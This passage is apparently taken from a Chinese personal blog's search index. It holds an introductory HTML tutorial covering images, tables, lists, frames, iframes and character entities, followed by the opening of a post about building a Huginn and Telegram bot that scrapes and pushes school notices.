也可以使用 id 属性来替代 name 属性。 然后在同一个文档中创建指向该锚的链接，或在其他页面指向该锚，即可跳转到这个锚点的位置。 将 # 符号和锚名称添加到 URL 的末端，就可以直接链接到 tips 这个命名锚了。 &lt;a href=\"#tips\" target=\"_self\"&gt;跳转到上面的锚点&lt;/a&gt; 跳转到上面的锚点 假如浏览器找不到已定义的命名锚，那么就会定位到文档的顶端。不会有错误发生。 图像空标签，只包含属性，并且没有闭合标签。 &lt;img src=\"url\" /&gt; 替代文本 alt 属性在浏览器无法载入图像时（图裂了），替换文本属性将被用来显示失去的信息。 &lt;img src=\"cat.gif\" alt=\"A cat\"&gt; 就像这样： 图像背景&lt;body background=\"/background.jpg\"&gt; 如果图像小于页面，图像会进行重复。 图像对齐&lt;h2&gt;未设置对齐方式的图像：&lt;/h2&gt; &lt;p&gt;图像 &lt;img src =\"pic.jpg\"&gt; 在文本中&lt;/p&gt; &lt;h2&gt;已设置对齐方式的图像：&lt;/h2&gt; &lt;p&gt;图像 &lt;img src=\"pic.jpg\" align=\"bottom\"&gt; 在文本中&lt;/p&gt; &lt;p&gt;图像 &lt;img src =\"pic.jpg\" align=\"middle\"&gt; 在文本中&lt;/p&gt; &lt;p&gt;图像 &lt;img src =\"pic.jpg\" align=\"top\"&gt; 在文本中&lt;/p&gt; bottom 对齐方式是默认的对齐方式。 浮动图像&lt;p&gt; &lt;img src =\"/i/eg_cute.gif\" align =\"left\"&gt; 带有图像的一个段落。图像的 align 属性设置为 \"left\"。图像将浮动到文本的左侧。 &lt;/p&gt; &lt;p&gt; &lt;img src =\"/i/eg_cute.gif\" align =\"right\"&gt; 带有图像的一个段落。图像的 align 属性设置为 \"right\"。图像将浮动到文本的右侧。 &lt;/p&gt; 图像尺寸通过改变 img 标签的 “height” 和 “width” 属性的值，可以放大或缩小图像。 &lt;img src=\"/html5.jpg\" width=\"50\" height=\"50\"&gt; &lt;img src=\"/html5.jpg\" width=\"100\" height=\"100\"&gt; &lt;img src=\"/html5.jpg\" width=\"200\" height=\"200\"&gt; 图像链接将一个图像当作链接使用。 &lt;a href=\"https://miaotony.xyz\"&gt;&lt;img src=\"/html5.jpg\" /&gt;&lt;/a&gt; 比如点一点这个就到达我的博客主页了→ （有可能被hexo优化掉emmm 创建图像映射创建带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。 img 元素中的 “usemap” 属性引用 map 元素中的 “id” 或 “name” 属性（根据浏览器） 图片左上角坐标为 (0,0)，右下角为 (x,y)，左往右为x轴正方向，上往下为y轴正方向。 &lt;img src=\"https://www.w3school.com.cn/i/eg_planets.jpg\" border=\"0\" usemap=\"#planetmap\" alt=\"Planets\" /&gt; &lt;map name=\"planetmap\" id=\"planetmap\"&gt; &lt;area shape=\"circle\" coords=\"180,139,14\" href =\"https://www.w3school.com.cn/example/html/venus.html\" target =\"_blank\" alt=\"Venus\" /&gt; &lt;area shape=\"circle\" coords=\"129,161,10\" href =\"https://www.w3school.com.cn/example/html/mercur.html\" target =\"_blank\" alt=\"Mercury\" /&gt; &lt;area shape=\"rect\" coords=\"0,0,110,260\" href =\"https://www.w3school.com.cn/example/html/sun.html\" target =\"_blank\" alt=\"Sun\" /&gt; &lt;/map&gt; 其中&lt;map&gt;用来定义图像地图，&lt;area&gt;用来定义图像地图中的可点击区域。 点击对应的区域会跳转到不同的页面。*（链接有可能被hexo优化掉emmm*还是可以点的 将图像转换为图像映射把一幅普通的图像设置为图像映射。加入ismap 属性，即可获得图片的坐标。 &lt;a href=\"/html_ismap.html\"&gt; &lt;img src=\"/planets.jpg\" ismap /&gt; &lt;/a&gt; 如果点击 (12,34)，则会访问/html_ismap.html?12,34. 表格每个表格由 table 标签开始。每个表格行由 tr 标签 (table row) 开始。每个表格数据由 td 标签 (table data) 开始，即数据单元格的内容。 数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。 （这里在博客上可能很多显示不正常，因为另外有CSS样式对全局表格进行了定义 &lt;table&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2 边框border属性 上面的例子没有边框，或者设置&lt;table border=\"0\"&gt;。 带有普通的边框： &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row 粗的边框（增大border）： &lt;table border=\"10\"&gt; First Row Second Row 表头th标签 大多数浏览器会把表头显示为粗体居中的文本 &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;Heading&lt;/th&gt; &lt;th&gt;Another Heading&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; Heading Another Heading row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2 下面是垂直的表头： &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;td&gt;Miao&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;电话&lt;/th&gt; &lt;td&gt;123456&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;电话&lt;/th&gt; &lt;td&gt;654321&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 姓名 Miao 电话 123456 电话 654321 空单元格&lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; row 1, cell 1 row 1, cell 2 row 2, cell 2 这个空的单元格的边框可能没有被显示出来。为了避免这种情况，在空单元格中添加一个空格占位符（&amp;nbsp;)，就可以将边框显示出来。 &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&amp;nbsp;&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; row 1, cell 1 row 1, cell 2 &nbsp; row 2, cell 2 表的标题caption标签 &lt;table border=\"6\"&gt; &lt;caption&gt;这是标题&lt;/caption&gt; &lt;tr&gt; &lt;td&gt;100&lt;/td&gt; &lt;td&gt;200&lt;/td&gt; &lt;td&gt;300&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;400&lt;/td&gt; &lt;td&gt;500&lt;/td&gt; &lt;td&gt;600&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 这是标题 100 200 300 400 500 600 单元格跨行跨列横跨列：colspan属性 &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th colspan=\"2\"&gt;电话&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Miao&lt;/td&gt; &lt;td&gt;123456&lt;/td&gt; &lt;td&gt;654321&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 姓名 电话 Miao 123456 654321 横跨行：rowspan属性 &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;td&gt;Miao&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th rowspan=\"2\"&gt;电话&lt;/th&gt; &lt;td&gt;123456&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;654321&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 姓名 Miao 电话 123456 654321 表格内标签&lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt; &lt;p&gt;这是一个段落。&lt;/p&gt; &lt;p&gt;这是另一个段落。&lt;/p&gt; &lt;/td&gt; &lt;td&gt;这个单元包含一个表格： &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;A&lt;/td&gt; &lt;td&gt;B&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;C&lt;/td&gt; &lt;td&gt;D&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;这个单元包含一个列表： &lt;ul&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;菠萝&lt;/li&gt; &lt;/ul&gt; &lt;/td&gt; &lt;td&gt;一张图片： &lt;img src=\"FrontEnd_HTML_Basic/html5.jpg\" alt=\"HTML5\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 这是一个段落。 这是另一个段落。 这个单元包含一个表格： A B C D 这个单元包含一个列表： 苹果 香蕉 菠萝 一张图片： 单元格边距Cellpadding 单元格内容与其边框之间的空白。 &lt;table border=\"1\" cellpadding=\"20\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row 单元格间距cellspacing 增加单元格之间的距离。 &lt;table border=\"1\" cellspacing=\"20\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row 表格/单元格背景背景颜色bgcolor属性 &lt;table border=\"1\" bgcolor=\"yellow\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row 背景图像background属性 &lt;table border=\"1\" background=\"FrontEnd_HTML_Basic/html5.jpg\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row 单元格背景同理，加在相应的td标签里即可。例如： &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td bgcolor=\"blue\"&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row 排列内容align属性 &lt;table width=\"400\" border=\"1\"&gt; &lt;tr&gt; &lt;th align=\"center\"&gt;消费项目....&lt;/th&gt; &lt;th align=\"center\"&gt;一月&lt;/th&gt; &lt;th align=\"center\"&gt;二月&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=\"left\"&gt;衣服&lt;/td&gt; &lt;td align=\"right\"&gt;$241.10&lt;/td&gt; &lt;td align=\"right\"&gt;$50.20&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=\"left\"&gt;食物&lt;/td&gt; &lt;td align=\"right\"&gt;$730.40&lt;/td&gt; &lt;td align=\"right\"&gt;$650.00&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th align=\"left\"&gt;总计&lt;/th&gt; &lt;th align=\"right\"&gt;$1001.50&lt;/th&gt; &lt;th align=\"right\"&gt;$744.65&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; 消费项目.... 一月 二月 衣服 $241.10 $50.20 食物 $730.40 $650.00 总计 $1001.50 $744.65 框架frame属性 &lt;p&gt;Table with frame=\"box\":&lt;/p&gt; &lt;table frame=\"box\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"above\":&lt;/p&gt; &lt;table frame=\"above\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"below\":&lt;/p&gt; &lt;table frame=\"below\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"hsides\":&lt;/p&gt; &lt;table frame=\"hsides\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"vsides\":&lt;/p&gt; &lt;table frame=\"vsides\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; Table with frame=\"box\": Month Savings January $100 Table with frame=\"above\": Month Savings January $100 Table with frame=\"below\": Month Savings January $100 Table with frame=\"hsides\": Month Savings January $100 Table with frame=\"vsides\": Month Savings January $100 行分组thead 元素应该与 tbody 和 tfoot 元素结合起来使用。（但很少使用这三个元素） tbody 元素用于对 HTML 表格中的主体内容进行分组，而 tfoot 元素用于对 HTML 表格中的表注（页脚）内容进行分组。 thead、tfoot 以及 tbody 元素使您有能力对表格中的行进行分组。当您创建某个表格时，您也许希望拥有一个标题行，一些带有数据的行，以及位于底部的一个总计行。这种划分使浏览器有能力支持独立于表格标题和页脚的表格正文滚动。当长的表格被打印时，表格的表头和页脚可被打印在包含表格数据的每张页面上。 &lt;thead&gt; 内部必须拥有 &lt;tr&gt; 标签！ &lt;table border=\"1\"&gt; &lt;thead style=\"color:green\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody style=\"color:blue;height:50px\"&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;February&lt;/td&gt; &lt;td&gt;$80&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot style=\"color:red\"&gt; &lt;tr&gt; &lt;td&gt;Sum&lt;/td&gt; &lt;td&gt;$180&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;/table&gt; Month Savings January $100 February $80 Sum $180 列分组col标签为表格中一个或多个列定义属性值。 col 元素是仅包含属性的空元素。如需创建列，您就必须在 tr 元素内部规定 td 元素。 例如为表格中的三个列规定了不同的对齐方式： &lt;table width=\"100%\" border=\"1\"&gt; &lt;col align=\"left\" /&gt; &lt;col align=\"left\" /&gt; &lt;col align=\"right\" /&gt; &lt;tr&gt; &lt;th&gt;ISBN&lt;/th&gt; &lt;th&gt;Title&lt;/th&gt; &lt;th&gt;Price&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3476896&lt;/td&gt; &lt;td&gt;My first HTML&lt;/td&gt; &lt;td&gt;$53&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; ISBN Title Price 3476896 My first HTML $53 （然而我用Firefox、Chrome、Edge都没有效果emmmm。 colgroup 标签用于对表格中的列进行组合，以便对其进行格式化。 如需对全部列应用样式，&lt;colgroup&gt;标签很有用，这样就不需要对各个单元和各行重复应用样式了。 &lt;colgroup&gt; 标签只能在 table 元素中使用。 例如两个 colgroup 元素为表格中的三列规定了不同的对齐方式和样式（注意第一个 colgroup 元素横跨两列）： &lt;table width=\"100%\" border=\"1\"&gt; &lt;colgroup span=\"2\" align=\"left\"&gt;&lt;/colgroup&gt; &lt;colgroup align=\"right\" style=\"color:#0000FF;\"&gt;&lt;/colgroup&gt; &lt;tr&gt; &lt;th&gt;ISBN&lt;/th&gt; &lt;th&gt;Title&lt;/th&gt; &lt;th&gt;Price&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3476896&lt;/td&gt; &lt;td&gt;My first HTML&lt;/td&gt; &lt;td&gt;$53&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; ISBN Title Price 3476896 My first HTML $53 （然而我这里还是没有效果emmm 列表无序列表Unordered list （这里的样式也被全局的样式给冲掉了 emmm 项目列表，项目默认使用粗体圆点（典型的小黑圆圈）进行标记。 &lt;ul&gt; &lt;li&gt;First item&lt;/li&gt; &lt;li&gt;Next item&lt;/li&gt; &lt;/ul&gt; First item Next item 可以定义不同的样式类型。 disc 类型&lt;ul type=\"disc\"&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;柠檬&lt;/li&gt; &lt;li&gt;桔子&lt;/li&gt; &lt;/ul&gt; 苹果 香蕉 柠檬 桔子 circle 类型&lt;ul type=\"circle\"&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;柠檬&lt;/li&gt; &lt;li&gt;桔子&lt;/li&gt; &lt;/ul&gt; 苹果 香蕉 柠檬 桔子 square 类型&lt;ul type=\"square\"&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;柠檬&lt;/li&gt; &lt;li&gt;桔子&lt;/li&gt; &lt;/ul&gt; 苹果 香蕉 柠檬 桔子 有序列表Ordered list 列表项目默认使用数字进行标记。 &lt;ol&gt; &lt;li&gt;First item&lt;/li&gt; &lt;li&gt;Next item&lt;/li&gt; &lt;/ol&gt; First item Next item 有序列表也可以定义不同的样式 数字列表&lt;ol type=\"1\"&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;柠檬&lt;/li&gt; &lt;li&gt;桔子&lt;/li&gt; &lt;/ol&gt; 苹果 香蕉 柠檬 桔子 字母列表大写字母 &lt;ol type=\"A\"&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;柠檬&lt;/li&gt; &lt;li&gt;桔子&lt;/li&gt; &lt;/ol&gt; 苹果 香蕉 柠檬 桔子 小写字母改成 &lt;ol type=\"a\"&gt; 即可。 罗马字母列表&lt;ol type=\"I\"&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;柠檬&lt;/li&gt; &lt;li&gt;桔子&lt;/li&gt; &lt;/ol&gt; 苹果 香蕉 柠檬 桔子 小写罗马字母则为 &lt;ol type=\"i\"&gt; 。 苹果 香蕉 柠檬 定义列表Definition list 自定义列表不仅仅是一列项目，而是项目及其注释的组合。 自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。 &lt;dl&gt; &lt;dt&gt;First term&lt;/dt&gt; &lt;dd&gt;Definition&lt;/dd&gt; &lt;dt&gt;Next term&lt;/dt&gt; &lt;dd&gt;Definition&lt;/dd&gt; &lt;/dl&gt; First term Definition Next term Definition 嵌套列表&lt;ul&gt; &lt;li&gt;咖啡&lt;/li&gt; &lt;li&gt;茶 &lt;ul&gt; &lt;li&gt;红茶&lt;/li&gt; &lt;li&gt;绿茶 &lt;ul&gt; &lt;li&gt;中国茶&lt;/li&gt; &lt;li&gt;非洲茶&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;牛奶&lt;/li&gt; &lt;/ul&gt; 咖啡 茶 红茶 绿茶 中国茶 非洲茶 牛奶 块可以通过 &lt;div&gt; 和 &lt;span&gt; 将 HTML 元素组合起来。 大多数 HTML 元素被定义为块级元素或内联元素。“块级元素” block level element，“内联元素” inline element。 块级元素在浏览器显示时，通常会以新行来开始（和结束）。 内联元素在显示时通常不会以新行开始。 div 元素division/section 可以说是最常用的块级元素8。可用于组合其他 HTML 元素的容器。 它没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。 如果与 CSS 一同使用，&lt;div&gt; 元素可用于对大的内容块设置样式属性。 &lt;div&gt; 元素的另一个常见的用途是文档布局。 span 元素内联元素，可用作文本的容器。 也没有特定的含义。 也可以与 CSS 一同使用，来给部分文本定义样式属性。 类class属性 可以用来给同一类元素设置相同的样式。 设置 &lt;div&gt; 元素的类，使我们能够为相同的 &lt;div&gt; 元素设置相同的样式： &lt;style&gt; .miaotest { background-color:pink; color:white; margin:20px; padding:20px; } &lt;/style&gt; &lt;div class=\"miaotest\"&gt; &lt;p&gt;London&lt;/p&gt; &lt;p&gt;London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.&lt;/p&gt; &lt;/div&gt; &lt;div class=\"miaotest\"&gt; &lt;p&gt;Paris&lt;/p&gt; &lt;p&gt;Paris is the capital and most populous city of France.&lt;/p&gt; &lt;/div&gt; .miaotest { background-color:pink; color:white; margin:20px; padding:20px; } London London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. Paris Paris is the capital and most populous city of France. 同理，也可以设置 &lt;span&gt; 元素的class属性来对相同类设置样式。 &lt;style&gt; span.redtest {color:red;} &lt;/style&gt; &lt;p&gt;My &lt;span class=\"redtest\"&gt;Important&lt;/span&gt; Things&lt;/p&gt; span.redtest {color:red;} My Important Things 网页布局这里 HTML5 新增了不少语义化元素，替代了原先 &lt;div id=\"xxx\"&gt;这样定义网页布局的形式。 具体的语义元素是这样的。 语义元素 含义 header 定义文档或节的页眉 nav 定义导航链接的容器 section 定义文档中的节 article 定义独立的自包含文章 aside 定义内容之外的内容（比如侧栏） footer 定义文档或节的页脚 details 定义额外的细节 summary 定义 details 元素的标题 例如： &lt;body&gt; &lt;header&gt; &lt;h1&gt;City Gallery&lt;/h1&gt; &lt;/header&gt; &lt;nav&gt; London&lt;br&gt; Paris&lt;br&gt; Tokyo&lt;br&gt; &lt;/nav&gt; &lt;section&gt; &lt;h1&gt;London&lt;/h1&gt; &lt;p&gt; London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. &lt;/p&gt; &lt;p&gt; Standing on the River Thames, London has been a major settlement for two millennia, its history going back to its founding by the Romans, who named it Londinium. &lt;/p&gt; &lt;/section&gt; &lt;footer&gt; Copyright W3School.com.cn &lt;/footer&gt; &lt;/body&gt; 具体后面再看看 HTML5 的新语义元素吧（ 框架通过使用框架，可以在同一个浏览器窗口中显示不止一个页面。 每份HTML文档称为一个框架，并且每个框架都独立于其他的框架。 结构框架标签 framesetframeset标签 / 框架集 它定义了如何将窗口分割为框架。每个 frameset 定义了一系列 行 或 列。 rows/columns 的值规定了每行或每列占据屏幕的面积。 框架标签 frameframe 标签定义了放置在每个框架中的 HTML 文档。 例如，下面这个例子定义了一个两列框架集，第一列占窗口的25%，显示frame_a.htm；第二列占75%，显示frame_b.htm。 &lt;html&gt; &lt;frameset cols=\"25%,75%\"&gt; &lt;frame src=\"frame_a.htm\"&gt; &lt;frame src=\"frame_b.htm\"&gt; &lt;/frameset&gt; &lt;/html&gt; 假如一个框架有可见边框，用户可以拖动边框来改变它的大小。为了避免这种情况发生，可以在 &lt;frame&gt; 标签中加入：noresize=\"noresize\"。 即（此处分成两行rows） &lt;frameset rows=\"25%,75%\"&gt; &lt;frame src=\"frame_a.htm\" noresize=\"noresize\"&gt; &lt;frame src=\"frame_b.htm\"&gt; &lt;/frameset&gt; noframes 标签不能将 &lt;body&gt;&lt;/body&gt; 标签与 &lt;frameset&gt;&lt;/frameset&gt; 标签同时使用！ 不过，假如添加包含一段文本的 &lt;noframes&gt; 标签，就必须将这段文字嵌套于 &lt;body&gt;&lt;/body&gt; 标签内。 &lt;html&gt; &lt;frameset cols=\"25%,50%,25%\"&gt; &lt;frame src=\"/example/html/frame_a.html\"&gt; &lt;frame src=\"/example/html/frame_b.html\"&gt; &lt;frame src=\"/example/html/frame_c.html\"&gt; &lt;noframes&gt; &lt;body&gt;您的浏览器无法处理框架！&lt;/body&gt; &lt;/noframes&gt; &lt;/frameset&gt; &lt;/html&gt; 混合框架结构&lt;html&gt; &lt;frameset rows=\"50%,50%\"&gt; &lt;frame src=\"/example/html/frame_a.html\"&gt; &lt;frameset cols=\"25%,75%\"&gt; &lt;frame src=\"/example/html/frame_b.html\"&gt; &lt;frame src=\"/example/html/frame_c.html\"&gt; &lt;/frameset&gt; &lt;/frameset&gt; &lt;/html&gt; 内嵌框架Iframe 用于在网页内显示网页。 height 和 width 属性用于规定 iframe 的高度和宽度。 属性值的默认单位是像素，但也可以用百分比来设定（比如 “80%”）。 对于不支持iframe的浏览器，可以把需要的提示文本放置在 &lt;iframe&gt; 和 &lt;/iframe&gt; 之间。 比如这里嵌套了一个我的博客首页（套娃嘻嘻嘻 &lt;iframe src=\"https://miaotony.xyz\" width=\"600\" height=\"400\"&gt;您的浏览器不支持iframe唉&lt;/iframe&gt; --- iframe 可用作链接的目标（target）。 链接的 target 属性必须引用 iframe 的 name 属性： &lt;iframe src=\"https://miaotony.xyz\" width=\"600\" height=\"200\" name=\"iframe_miao\"&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=\"https://miaotony.xyz/friends\" target=\"iframe_miao\"&gt;friends&lt;/a&gt;&lt;/p&gt; friends （可能部署博客的时候这里用不了 脚本script 元素 &lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。 script 元素既可包含脚本语句，也可通过 src 属性指向外部脚本文件。 &lt;noscript&gt; 标签提供无法使用脚本时的替代内容。 &lt;script type=\"text/javascript\"&gt; function sayhello(){ alert(\"Hello World!\"); } &lt;/script&gt; &lt;noscript&gt;Sorry, your browser does not support JavaScript!&lt;/noscript&gt; function sayhello(){ alert(\"Hello World!\"); } Sorry, your browser does not support JavaScript!点这里试试呗~ 后面学JavaScript再慢慢看（ 字符实体HTML 中的预留字符必须被替换为字符实体。 形式类似于这样 &amp;entity_name; &amp;#entity_number; 如 &amp;lt; 或 &amp;#60; 表示小于号 &lt; 。 不间断空格 &amp;nbsp; URL 编码URL，Uniform Resource Locator，统一资源定位符。 URL 只能使用 ASCII 字符集来通过因特网进行发送。 URL 编码会将字符转换为可通过因特网传输的格式。 它使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。 URL 不能包含空格。URL 编码通常使用 + 来替换空格。 （之前玩CTF就遇到过一个题，它的某个参数里需要输入加号（+），所以要写成 %2b。 小结入门就到这里了吧emmm 虽然有点枯燥，但所见所得还是挺有趣的哈哈哈。 进阶再来看看HTML的表单与输入，还有H5中的新元素，画布、音视频等等。 溜了溜了 嘻嘻嘻","path":"2020/02/14/FrontEnd_HTML_Basic/"},{"title":"小想法 | 利用Huginn&TelegramBot实现教务通知自动爬取与推送","text":"前言前不久在服务器上装好了Huginn（详见这里：基于Docker搭建Huginn）。 这几天折腾了一下，尝试着用它来爬点东西玩一下（bushi 想了一下，平时会关注教务的通知，每次都要访问教务网站，虽然说也不是很麻烦，但我想要一个自动推送的工具。或者说，不需要我主动去看有没有新通知，而是有新通知公告了就直接推过来。（类似于Webhook？ 😃 说到这个，其实之前在 RSSHub 上看到过一个，不过现在好像失效了。考虑到目前没有折腾 RSSHub 的打算，干脆就用 Huginn 自己弄一个好了。 说干就干了啦。 哦对了，最终的效果大概这样—— 通知的爬取与其说专门打造一个教务通知公告的爬取，不如说记录一下 Huginn 的基本使用方法。 说实话，Huginn 的资料真的少，感觉国内都没有多少介绍这个的，于是遇到了不少问题经常不知道怎么办emmm。 一些小介绍打开你喜欢的浏览器，进入 Huginn（默认为 127.0.0.1:3000），最上方有如下几个选项。 其中Agents就是你的一个个小兵，他们可以互相协作，按照流水线依次完成各自的使命。 Scenarios 就是这些小兵的集合，或者说是某种场景，官方描述是 Scenarios are named groups of Agents. Scenarios allow you to organize your agents, and to import and export sets of Agents to share. 比如说你有A、B、C三个Agent，他们共同完成一个任务，你就可以把他们集合起来作为一个Scenario。 Events 是小兵们收集来的信息。 Credentials 用来记录一些常量，或者说是环境变量。 Credentials are used to store values used by many Agents. Examples might include “twitter_consumer_secret”, “user_full_name”, or “user_birthday”. 在使用时，就可以像 {% credential Meow_API %} 这样来引用，其中 Meow_API 在 Credentials 中进行定义。 大体思路Huginn 里有很多种 Agent，这里用到的可以说是最常用的 Website Agent 和 Post Agent 。 更多的可以参考官方 Wiki 的介绍，在这里。 这个项目的思路就是 访问教务网站，爬取通知公告栏的标题及链接 